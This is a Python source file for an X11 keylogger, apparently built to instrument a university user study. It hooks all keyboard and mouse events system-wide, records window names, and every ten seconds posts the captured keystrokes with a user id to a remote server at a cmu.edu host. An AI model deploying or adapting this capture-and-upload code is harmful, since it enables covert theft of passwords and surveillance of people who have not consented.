import json
import requests
import os
import re
import sys
import threading
import time
from argparse import ArgumentParser
from datetime import datetime

from Xlib import XK, X, display, error  # noqa
from Xlib.ext import record
from Xlib.protocol import rq


class ItemStore(object):
    def __init__(self):
        self.lock = threading.Lock()
        self.items = []

    def add(self, item):
        with self.lock:
            self.items.append(item)

    def getAll(self):
        with self.lock:
            items, self.items = self.items, []
        return items

event_store = ItemStore()

def print_err(*args, **kwargs):
    """ A wrapper for print() that uses stderr by default. """
    if kwargs.get('file', None) is None:
        kwargs['file'] = sys.stderr
    print(*args, **kwargs)


class HookManager(threading.Thread):
    """ This is the main class. Instantiate it, and you can hand it KeyDown
        and KeyUp (functions in your own code) which execute to parse the
        PyxHookKeyEvent class that is returned.
        This simply takes these two values for now:
        KeyDown = The function to execute when a key is pressed, if it returns
        anything. It hands the function an argument that is the
        PyxHookKeyEvent class.
        KeyUp = The function to execute when a key is released, if it returns
        anything. It hands the function an argument that is the
        PyxHookKeyEvent class.
    """
    def __init__(self):
        threading.Thread.__init__(self)
        self.finished = threading.Event()

        # Give these some initial values
        self.mouse_position_x = 0
        self.mouse_position_y = 0
        self.ison = {'shift': False, 'caps': False}

        # Compile our regex statements.
        self.isshift = re.compile('^Shift')
        self.iscaps = re.compile('^Caps_Lock')
        self.shiftablechar = re.compile('|'.join((
            '^[a-z0-9]$',
            '^minus$',
            '^equal$',
            '^bracketleft$',
            '^bracketright$',
            '^semicolon$',
            '^backslash$',
            '^apostrophe$',
            '^comma$',
            '^period$',
            '^slash$',
            '^grave$'
        )))
        self.logrelease = re.compile('.*')
        self.isspace = re.compile('^space$')

        # Assign default function actions (do nothing).
        self.KeyDown = lambda x: True
        self.KeyUp = lambda x: True
        self.MouseAllButtonsDown = lambda x: True
        self.MouseAllButtonsUp = lambda x: True

        self.contextEventMask = [X.KeyPress, X.MotionNotify]

        # Hook to our display.
        self.local_dpy = display.Display()
        self.record_dpy = display.Display()

    def run(self):
        # Check if the extension is present
        if not self.record_dpy.has_extension('RECORD'):
            print_err('RECORD extension not found')
            sys.exit(1)
        r = self.record_dpy.record_get_version(0, 0)
        print_err('RECORD extension version {}.{}'.format(
            r.major_version,
            r.minor_version
        ))

        # Create a recording context; we only want key and mouse events
        self.ctx = self.record_dpy.record_create_context(
            0,
            [record.AllClients],
            [{
                'core_requests': (0, 0),
                'core_replies': (0, 0),
                'ext_requests': (0, 0, 0, 0),
                'ext_replies': (0, 0, 0, 0),
                'delivered_events': (0, 0),
                #                (X.KeyPress, X.ButtonPress),
                'device_events': tuple(self.contextEventMask),
                'errors': (0, 0),
                'client_started': False,
                'client_died': False,
            }]
        )

        # Enable the context; this only returns after a call to record_disable
        # context, while calling the callback function in the meantime
        self.record_dpy.record_enable_context(self.ctx, self.processevents)
        # Finally free the context
        self.record_dpy.record_free_context(self.ctx)

    def cancel(self):
        self.finished.set()
        self.local_dpy.record_disable_context(self.ctx)
        self.local_dpy.flush()

    def printevent(self, event):
        print(event)

    def add_to_queue(self, event):
        event_store.add(event.to_dict())

    def HookKeyboard(self):
        # We don't need to do anything here anymore, since the default mask
        # is now set to contain X.KeyPress
        # self.contextEventMask[0] = X.KeyPress
        pass

    def HookMouse(self):
        # We don't need to do anything here anymore, since the default mask
        # is now set to contain X.MotionNotify

        # need mouse motion to track pointer position, since ButtonPress
        # events don't carry that info.
        # self.contextEventMask[1] = X.MotionNotify
        pass

    def processevents(self, reply):
        if reply.category != record.FromServer:
            return
        if reply.client_swapped:
            print_err('* received swapped protocol data, cowardly ignored')
            return
        try:
            # Python 2
            intval = ord(reply.data[0])
        except TypeError:
            # Python 3.
            intval = reply.data[0]
        if (not reply.data) or (intval < 2):
            # not an event
            return
        data = reply.data
        while len(data):
            event, data = rq.EventField(None).parse_binary_value(
                data,
                self.record_dpy.display,
                None,
                None
            )
            if event.type == X.KeyPress:
                hookevent = self.keypressevent(event)
                self.KeyDown(hookevent)
            elif event.type == X.KeyRelease:
                hookevent = self.keyreleaseevent(event)
                self.KeyUp(hookevent)
            elif event.type == X.ButtonPress:
                hookevent = self.buttonpressevent(event)
                self.MouseAllButtonsDown(hookevent)
            elif event.type == X.ButtonRelease:
                hookevent = self.buttonreleaseevent(event)
                self.MouseAllButtonsUp(hookevent)
            elif event.type == X.MotionNotify:
                # use mouse moves to record mouse position, since press and
                # release events
                # do not give mouse position info
                # (event.root_x and event.root_y have bogus info).
                self.mousemoveevent(event)

        # print('processing events...', event.type)

    def keypressevent(self, event):
        matchto = self.lookup_keysym(
            self.local_dpy.keycode_to_keysym(event.detail, 0)
        )
        if self.shiftablechar.match(
                self.lookup_keysym(
                    self.local_dpy.keycode_to_keysym(event.detail, 0))):
            # This is a character that can be typed.
            if not self.ison['shift']:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
                return self.makekeyhookevent(keysym, event)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
                return self.makekeyhookevent(keysym, event)
        else:
            # Not a typable character.
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            if self.isshift.match(matchto):
                self.ison['shift'] = self.ison['shift'] + 1
            elif self.iscaps.match(matchto):
                if not self.ison['caps']:
                    self.ison['shift'] = self.ison['shift'] + 1
                    self.ison['caps'] = True
                if self.ison['caps']:
                    self.ison['shift'] = self.ison['shift'] - 1
                    self.ison['caps'] = False
            return self.makekeyhookevent(keysym, event)

    def keyreleaseevent(self, event):
        if self.shiftablechar.match(
                self.lookup_keysym(
                    self.local_dpy.keycode_to_keysym(event.detail, 0))):
            if not self.ison['shift']:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
        else:
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
        matchto = self.lookup_keysym(keysym)
        if self.isshift.match(matchto):
            self.ison['shift'] = self.ison['shift'] - 1
        return self.makekeyhookevent(keysym, event)

    def buttonpressevent(self, event):
        return self.makemousehookevent(event)

    def buttonreleaseevent(self, event):
        return self.makemousehookevent(event)

    def mousemoveevent(self, event):
        self.mouse_position_x = event.root_x
        self.mouse_position_y = event.root_y

    # need the following because XK.keysym_to_string() only does printable
    # chars rather than being the correct inverse of XK.string_to_keysym()
    def lookup_keysym(self, keysym):
        for name in dir(XK):
            if name.startswith('XK_') and getattr(XK, name) == keysym:
                return name.lstrip('XK_')
        return '[{}]'.format(keysym)

    def asciivalue(self, keysym):
        asciinum = XK.string_to_keysym(self.lookup_keysym(keysym))
        if asciinum < 256:
            return asciinum
        else:
            return 0

    def makekeyhookevent(self, keysym, event):
        storewm = self.xwindowinfo()
        if event.type == X.KeyPress:
            MessageName = 'key down'
        elif event.type == X.KeyRelease:
            MessageName = 'key up'
        return PyxHookKeyEvent(
            storewm['handle'],
            storewm['name'],
            storewm['class'],
            self.lookup_keysym(keysym),
            self.asciivalue(keysym),
            False,
            event.detail,
            MessageName
        )

    def makemousehookevent(self, event):
        storewm = self.xwindowinfo()
        if event.detail == 1:
            MessageName = 'mouse left '
        elif event.detail == 3:
            MessageName = 'mouse right '
        elif event.detail == 2:
            MessageName = 'mouse middle '
        elif event.detail == 5:
            MessageName = 'mouse wheel down '
        elif event.detail == 4:
            MessageName = 'mouse wheel up '
        else:
            MessageName = 'mouse {} '.format(event.detail)

        if event.type == X.ButtonPress:
            MessageName = '{}down'.format(MessageName)
        elif event.type == X.ButtonRelease:
            MessageName = '{}up'.format(MessageName)
        return PyxHookMouseEvent(
            storewm['handle'],
            storewm['name'],
            storewm['class'],
            (self.mouse_position_x, self.mouse_position_y),
            MessageName
        )

    def xwindowinfo(self):
        try:
            windowvar = self.local_dpy.get_input_focus().focus
            wmname = windowvar.get_wm_name()
            wmclass = windowvar.get_wm_class()
            wmhandle = str(windowvar)[20:30]
        except:
            # This is to keep things running smoothly.
            # It almost never happens, but still...
            return {'name': None, 'class': None, 'handle': None}
        if (wmname is None) and (wmclass is None):
            try:
                windowvar = windowvar.query_tree().parent
                wmname = windowvar.get_wm_name()
                wmclass = windowvar.get_wm_class()
                wmhandle = str(windowvar)[20:30]
            except:
                # This is to keep things running smoothly.
                # It almost never happens, but still...
                return {'name': None, 'class': None, 'handle': None}
        if wmclass is None:
            return {'name': wmname, 'class': wmclass, 'handle': wmhandle}
        else:
            return {'name': wmname, 'class': wmclass[0], 'handle': wmhandle}


class PyxHookKeyEvent(object):
    """This is the class that is returned with each key event.f
    It simply creates the variables below in the class.
    Window = The handle of the window.
    WindowName = The name of the window.
    WindowProcName = The backend process for the window.
    Key = The key pressed, shifted to the correct caps value.
    Ascii = An ascii representation of the key. It returns 0 if the ascii
    value is not between 31 and 256.
    KeyID = This is just False for now. Under windows, it is the Virtual Key
    Code, but that's a windows-only thing.
    ScanCode = Please don't use this. It differs for pretty much every type of
    keyboard. X11 abstracts this information anyway.
    MessageName = 'key down', 'key up'.
    """

    def __init__(
            self, Window, WindowName, WindowProcName, Key, Ascii, KeyID,
            ScanCode, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Key = Key
        self.Ascii = Ascii
        self.KeyID = KeyID
        self.ScanCode = ScanCode
        self.MessageName = MessageName
        self.timestamp = int(time.time())

    def __str__(self):
        return '\n'.join((
            'Window Handle: {s.Window}',
            'Window Name: {s.WindowName}',
            'Window\'s Process Name: {s.WindowProcName}',
            'Key Pressed: {s.Key}',
            'Ascii Value: {s.Ascii}',
            'KeyID: {s.KeyID}',
            'ScanCode: {s.ScanCode}',
            'MessageName: {s.MessageName}',
        )).format(s=self)

    def to_dict(self):
        return self.__dict__

class PyxHookMouseEvent(object):
    """This is the class that is returned with each key event.f
    It simply creates the variables below in the class.
    Window = The handle of the window.
    WindowName = The name of the window.
    WindowProcName = The backend process for the window.
    Position = 2-tuple (x,y) coordinates of the mouse click
    MessageName = 'mouse left|right|middle down', 'mouse left|right|middle up'
    """

    def __init__(
            self, Window, WindowName, WindowProcName, Position, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Position = Position
        self.MessageName = MessageName
        self.timestamp = int(time.time())

    def __str__(self):
        return '\n'.join((
            'Window Handle: {s.Window}',
            'Window\'s Process Name: {s.WindowProcName}',
            'Position: {s.Position}',
            'MessageName: {s.MessageName}',
        )).format(s=self)

    def to_dict(self):
        return self.__dict__


class ConsumerThread(threading.Thread):
    def __init__(self):
        super(ConsumerThread,self).__init__()

    def read_current_user_task(self):
        path = '/vagrant/.user_study_current_status'
        if not os.path.exists(path):
            return None, None
        with open(path, "r", encoding='utf-8') as f:
            lines = f.readlines()
            userid = lines[0].strip()
            task = lines[1].strip()
        return userid, task


    def run(self):
        while True:
            time.sleep(10)
            userid, task = self.read_current_user_task()
            items = event_store.getAll()
            if items:
                payload = {
                    'events': items,
                    'client_timestamp': int(time.time()),
                    'userid': userid,
                    'task': task
                }
                try:
                    res = requests.post('http://moto.clab.cs.cmu.edu:8081/keylog', json=payload, timeout=3.0)
                except:
                    print('exception')



def main():
    ts = datetime.now().strftime("%d-%m-%Y_%H:%M:%S")
    parser = ArgumentParser(description='A simple keylogger for Linux.')
    parser.add_argument(
            '--log-file',
            default=os.path.join(os.getcwd(), 'keys-' + str(ts) + '.log'),
            help='Save the output in this file.',
            )
    parser.add_argument(
            '--clean-file',
            action='store_true',
            default=False,
            help='Clear the log file on startup.Default is No',
            )
    parser.add_argument(
            '--cancel-key',
            help='A single key that use as the cancel key, Default is ` (backtick)',
            )

    args = parser.parse_args()

    log_file = args.log_file

    if args.clean_file:
        try:
            os.remove(log_file)
        except OSError:
            # TODO: log with logging module
            pass

    cancel_key = args.cancel_key[0] if args.cancel_key else  '`'

    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

        if event.Ascii == cancel_key:
            new_hook.cancel()

    new_hook = HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n  {}'.format(ex)
        print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

if __name__ == '__main__':
    hm = HookManager()
    ct = ConsumerThread()
    hm.HookKeyboard()
    hm.HookMouse()
    hm.KeyDown = hm.add_to_queue
    hm.KeyUp = hm.add_to_queue
    hm.MouseAllButtonsDown = hm.add_to_queue
    hm.MouseAllButtonsUp = hm.add_to_queue
    hm.start()
    ct.start()
    # time.sleep(30)
    # hm.cancel()

